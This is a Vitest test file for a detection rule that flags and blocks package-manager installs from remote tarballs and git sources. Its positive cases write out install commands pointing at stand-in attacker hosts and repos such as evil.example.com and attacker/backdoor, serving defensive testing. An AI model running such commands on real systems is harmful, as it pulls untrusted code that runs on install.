import { describe, it } from 'vitest';
import { expectRuleMatch, expectRuleDidNotMatch, expectRuleMetadata } from '../helpers.js';

const RULE = 'supply_chain_install_remote_source';

describe(RULE, () => {
  describe('positive cases – should match', () => {
    it('matches npm i from a remote .tgz tarball', async () => {
      await expectRuleMatch(`npm i https://evil.example.com/pkg.tgz`, RULE);
    });

    it('matches npm install from a remote .tar.gz tarball', async () => {
      await expectRuleMatch(`npm install https://cdn.example.com/payload.tar.gz`, RULE);
    });

    it('matches pnpm add from a git+https URL', async () => {
      await expectRuleMatch(`pnpm add git+https://github.com/attacker/pkg.git`, RULE);
    });

    it('matches yarn add from a git+ssh URL', async () => {
      await expectRuleMatch(`yarn add git+ssh://git@github.com/attacker/pkg.git`, RULE);
    });

    it('matches bun add from a git:// URL', async () => {
      await expectRuleMatch(`bun add git://example.com/attacker/pkg.git`, RULE);
    });

    it('matches npm i from the github: shorthand', async () => {
      await expectRuleMatch(`npm i github:attacker/backdoor`, RULE);
    });

    it('matches npm install from the scp-like git@host: form', async () => {
      await expectRuleMatch(`npm install git@github.com:attacker/pkg.git`, RULE);
    });

    it('matches pnpm i from a tarball with flags before the URL', async () => {
      await expectRuleMatch(`pnpm i --save-dev https://evil.example.com/tool.tgz`, RULE);
    });
  });

  describe('negative cases – should NOT match', () => {
    it('does NOT match a normal registry install by name', async () => {
      await expectRuleDidNotMatch(`npm i posthog-js`, RULE);
    });

    it('does NOT match a bare pnpm shorthand install', async () => {
      await expectRuleDidNotMatch(`pnpm i react`, RULE);
    });

    it('does NOT match a custom-registry flag pointing at a registry root', async () => {
      await expectRuleDidNotMatch(`npm install --registry https://registry.npmjs.org lodash`, RULE);
    });

    it('does NOT match a plain https URL that is not a tarball or git source', async () => {
      await expectRuleDidNotMatch(`npm install --registry=https://npm.internal.example.com typescript`, RULE);
    });

    it('does NOT match a local path install', async () => {
      await expectRuleDidNotMatch(`npm install ./vendor/local-pkg`, RULE);
    });

    it('does NOT match prose mentioning a tarball URL', async () => {
      await expectRuleDidNotMatch(`The release is published at https://example.com/pkg.tgz for download.`, RULE);
    });

    it('does NOT match a deno URL install (idiomatic for deno)', async () => {
      await expectRuleDidNotMatch(`deno install https://deno.land/std/http/file_server.ts`, RULE);
    });
  });

  describe('metadata', () => {
    it('exposes all required metadata fields on a match', async () => {
      await expectRuleMetadata(
        `npm i https://evil.example.com/pkg.tgz`,
        RULE,
        { severity: 'high', category: 'supply_chain', action: 'block' },
      );
    });
  });
});
